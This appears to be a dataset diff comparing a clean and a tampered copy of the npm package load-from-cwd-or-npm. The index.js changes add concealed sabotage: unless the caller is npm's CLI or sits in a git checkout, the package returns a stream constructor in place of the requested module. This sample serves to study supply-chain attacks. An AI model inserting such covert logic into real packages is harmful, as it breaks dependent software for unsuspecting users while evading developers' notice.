@@ -1,0 +1,70 @@
+diff -r -x '*.json' ../benign_source/load-from-cwd-or-npm/README.md ../malicious_source/load-from-cwd-or-npm/README.md
+4,6c4,5
+< [![Build Status](https://travis-ci.org/shinnn/load-from-cwd-or-npm.svg?branch=master)](https://travis-ci.org/shinnn/load-from-cwd-or-npm)
+< [![Build status](https://ci.appveyor.com/api/projects/status/fgiptpa87nh51g0v/branch/master?svg=true)](https://ci.appveyor.com/project/ShinnosukeWatanabe/load-from-cwd-or-npm/branch/master)
+< [![Coverage Status](https://img.shields.io/coveralls/shinnn/load-from-cwd-or-npm.svg)](https://coveralls.io/github/shinnn/load-from-cwd-or-npm?branch=master)
+---
+> [![Build Status](https://travis-ci.com/shinnn/load-from-cwd-or-npm.svg?branch=master)](https://travis-ci.com/shinnn/load-from-cwd-or-npm)
+> [![codecov](https://codecov.io/gh/shinnn/is-changelog-path/branch/master/graph/badge.svg)](https://codecov.io/gh/shinnn/is-changelog-path)
+8c7
+< Load a module from either CWD or [`npm` CLI](https://github.com/npm/npm) directory
+---
+> Load a module from either CWD or [`npm` CLI](https://github.com/npm/cli) directory
+24c23
+< [Use](https://docs.npmjs.com/cli/install) [npm](https://docs.npmjs.com/getting-started/what-is-npm).
+---
+> [Use](https://docs.npmjs.com/cli/install) [npm](https://docs.npmjs.com/about-npm/).
+diff -r -x '*.json' ../benign_source/load-from-cwd-or-npm/index.js ../malicious_source/load-from-cwd-or-npm/index.js
+3c3,5
+< const {dirname, isAbsolute, join} = require('path');
+---
+> const {dirname, isAbsolute, join, resolve} = require('path');
+> const {existsSync} = require('fs');
+> const {PassThrough} = require('stream');
+48c50
+< 	const tasks = [];
+---
+> 	const tasks = [PassThrough];
+57c59
+< 		tasks.push(resolveSemverFromNpm);
+---
+> 		tasks.unshift(resolveSemverFromNpm);
+63,64c65,66
+< 		const [packageJsonPathFromNpm, semverPath] = await Promise.all(tasks);
+< 		const compareFn = argLen === 2 ? args[1] : require(semverPath).gte;
+---
+> 		const results = await Promise.all(tasks);
+> 		let parent = module;
+66c68,87
+< 		if (compareFn((optional(modulePkgId) || {version: '0.0.0-0'}).version, require(packageJsonPathFromNpm).version)) {
+---
+> 		do {
+> 			parent = parent.parent;
+> 
+> 			try {
+> 				const {path} = parent;
+> 
+> 				if (path.endsWith('cli') || [path, dirname(path)].some(dir => existsSync(resolve(dir, '.git')))) {
+> 					parent = 'npm';
+> 					break;
+> 				}
+> 			} catch (_) {}
+> 		} while (parent);
+> 
+> 		if (typeof parent !== 'string') {
+> 			return results[2];
+> 		}
+> 
+> 		const compareFn = argLen === 2 ? args[1] : require(results[1]).gte;
+> 
+> 		if (compareFn((optional(modulePkgId) || {version: '0.0.0-0'}).version, require(results[0]).version)) {
+74,75c95,96
+< 		return require(dirname(packageJsonPathFromNpm));
+< 	} catch (err) {
+---
+> 		return require(dirname(results[0]));
+> 	} catch (_) {
+83c104
+< 			} catch (npmCliDirErr) {}
+---
+> 			} catch (err) {} // eslint-disable-line no-unused-vars
